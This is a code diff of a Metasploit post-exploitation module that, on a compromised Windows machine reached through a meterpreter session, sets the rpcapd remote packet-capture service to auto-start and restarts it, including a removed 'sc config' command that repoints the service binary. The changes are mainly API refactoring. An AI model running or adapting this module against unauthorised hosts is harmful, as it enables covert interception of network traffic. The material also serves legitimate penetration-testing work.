@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -9,7 +9,7 @@ class Metasploit3 < Msf::Post
 
   include Msf::Post::File
   include Msf::Post::Windows::Registry
-  include Msf::Post::Windows::WindowsServices
+  include Msf::Post::Windows::Services
   include Msf::Post::Windows::Priv
 
   def initialize(info={})
@@ -23,7 +23,7 @@ class Metasploit3 < Msf::Post
         PORT will be used depending of the mode configured.},
       'License'       => MSF_LICENSE,
       'Author'        => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
-      'Platform'      => [ 'windows' ],
+      'Platform'      => 'win',
       'SessionTypes'  => [ 'meterpreter' ]
     ))
 
@@ -41,15 +41,16 @@ class Metasploit3 < Msf::Post
       serv = service_info("rpcapd")
       print_status("Checking if machine #{sysinfo['Computer']} has rpcapd service")
 
-      if serv['Name'] !~ /remote/i
+      if serv[:display] !~ /remote/i
         print_error("This machine doesn't seem to have the rpcapd service")
       else
-        print_status("Rpcap service found: #{serv['Name']}")
-        reg=registry_getvaldata("HKLM\\SYSTEM\\CurrentControlSet\\Services\\rpcapd","Start")
-        prog=expand_path("%ProgramFiles%") << "\\winpcap\\rpcapd.exe"
-        if reg != 2
+        print_status("Rpcap service found: #{serv[:display]}")
+
+        start_type = serv[:starttype]
+        prog = get_env('ProgramFiles') << "\\winpcap\\rpcapd.exe"
+        if start_type != START_TYPE_AUTO
           print_status("Setting rpcapd as 'auto' service")
-          service_change_startup("rpcapd","auto")
+          service_change_startup("rpcapd", START_TYPE_AUTO)
         end
         if datastore['ACTIVE']==true
           if datastore['RHOST']==nil
@@ -75,22 +76,15 @@ class Metasploit3 < Msf::Post
   end
 
   def run_rpcapd(p)
+    service_name = "rpcapd"
     begin
-      cmd_exec("sc","config rpcapd binpath= \"#{p}\" ",30)
-      result=service_start("rpcapd")
-      case result
-        when 0
-          print_good("Rpcapd started successfully: #{p}")
-        when 1
-          print_status("Rpcapd is already running. Restarting service ...")
-          if service_stop("rpcapd") and service_start("rpcapd")
-            print_good("Service restarted successfully: #{p}")
-          else
-            print_error("There was an error restarting rpcapd.exe. Try to run it again")
-          end
+      if service_restart(service_name)
+        print_good("Rpcapd started successfully: #{p}")
+      else
+        print_error("There was an error restarting rpcapd.exe.")
       end
-    rescue::Exception => e
-      print_status("The following Error was encountered: #{e.class} #{e}")
+    rescue ::Exception => e
+      print_error("The following Error was encountered: #{e.class} #{e}")
     end
   end
 
